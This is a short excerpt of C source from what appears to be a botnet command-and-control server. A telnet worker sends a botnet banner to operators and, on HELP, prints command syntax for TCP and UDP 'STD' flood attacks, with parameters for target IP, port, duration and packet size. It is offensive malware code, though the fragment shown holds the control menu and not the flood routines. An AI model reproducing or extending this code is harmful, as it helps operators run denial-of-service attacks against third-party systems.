...
void *telnetWorker(void *sock)
{
		...
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
			...
			if(strstr(buf, "HELP")) {
				...
				sprintf(ddosline2, "\x1b[31m\x1b[31m[IP][PORT][TIME][NETMASK][PACKET SIZE][TIME POLL INTERVAL]\r\n");
				sprintf(ddosline3, "\x1b[31m\x1b[35m!* TCP [IP] [PORT] [TIME] 32 all 0 10 | TCP FLOOD\r\n");
				sprintf(ddosline4, "\x1b[31m\x1b[31m[IP][PORT][TIME][NETMASK][FLAG][PACKET SIZE][TIME POLL INTERVAL]\r\n");
				sprintf(ddosline5, "\x1b[31m\x1b[35m!* STD [IP] [PORT] [TIME] | UDP Based STD FLOOD\r\n");
